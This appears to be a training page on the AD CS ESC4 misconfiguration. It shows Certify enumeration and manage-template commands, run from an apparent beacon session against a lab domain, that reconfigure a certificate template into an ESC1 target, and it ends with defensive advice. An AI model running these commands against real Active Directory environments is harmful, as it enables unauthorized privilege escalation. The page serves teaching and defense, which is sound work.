---
title: "ESC4: Vulnerable Certificate Template Access Control"
date: 2026-09-25
weight: 1
type: docs
tags:
  - AD CS
  - Certificate Templates
  - ESC4
  - Active Directory
---

## What ESC4 is

ESC4 is a privilege-escalation condition in Active Directory Certificate Services that arises when a certificate template carries an overly permissive ACE. If a low-privileged principal can modify the template, they can simply reconfigure it into a state that is vulnerable to another escalation technique and then abuse that. Five rights are worth watching for, because any one of them provides enough control to rewrite the template:

- **Owner.** The principal has implicit full control of the template and can edit any property.
- **FullControl.** The principal has explicit full control of the template and can edit any property.
- **WriteProperty.** The principal has generic write over the template and can edit any property.
- **WriteOwner.** The principal can take ownership of the template.
- **WriteDacl.** The principal can rewrite the template's access controls.

The following shows how such a template looks when enumerated. Certify flags the ESC4 condition and lists exactly which principals hold the dangerous rights:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

    Template Name                         : ESC4
    Enabled                               : True
    Publishing CAs                        : hq-ca-01.arcadia.local\ARCADIA Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
    Vulnerabilities
      ESC4                                : The template has insecure delegated permissions.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
      Object Control Permissions
        Write Owner                 : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
        Write Dacl                  : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
        Write Property              : ARCADIA\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
```

In this case every dangerous right has been handed to *Domain Users*, meaning any authenticated user in the domain can reshape the template at will.

## Reconfiguring the template

Certify's `manage-template` command is what turns those write permissions into a concrete escalation. Among other things it lets you:

- Grant enrollment rights with `--enroll <sid>`, where `<sid>` is the SID of a principal such as a user or group.
- Turn manager approval on or off with `--manager-approval`, and set the number of required authorised signatures with `--authorized-signatures 0`.
- Toggle EKUs that permit client authentication with `--client-auth`, `--pkinit-auth`, or `--smartcard-logon`.
- Toggle the `ENROLLEE_SUPPLIES_SUBJECT` flag with `--supply-subject`.

The goal is to bend the template into a shape you already know how to exploit. Here the Client Authentication EKU is present, so the template is one setting away from being an ESC1 target: all that is missing is the ability to specify an arbitrary subject. Enabling `ENROLLEE_SUPPLIES_SUBJECT` closes that gap, after which the standard ESC1 flow applies.

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
[*] Action: Manage a certificate template
[*] Using the search base 'CN=Configuration,DC=arcadia,DC=local'
[*] Attempting to toggle certificate name flags on the certificate template.
[*] Successfully modified the certificate template.

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --template ESC4 --quiet
[...snip...]
Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
```

With the flag set, the template now allows the enrollee to supply their own subject, and enrolment can proceed exactly as it would against a natively vulnerable ESC1 template, requesting a certificate as a privileged user.

## Defensive considerations

ESC4 is fundamentally an access-control problem rather than a flaw in any single template setting, so the fix is to audit who can write to certificate templates. Broad principals such as *Domain Users* or *Authenticated Users* should never hold Owner, FullControl, WriteDacl, WriteOwner, or write access to template properties; restrict those rights to a small, dedicated PKI administration group. Because the abuse depends on modifying the template, monitor for changes to template objects under the configuration partition, treating an unexpected flip of `ENROLLEE_SUPPLIES_SUBJECT`, a new EKU, or a changed DACL as high-signal events. Reviewing templates for the downstream conditions they could be turned into, ESC1 in particular, helps prioritise which permissive ACEs to remediate first.

## Further reading

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [GhostPack Certify](https://github.com/GhostPack/Certify)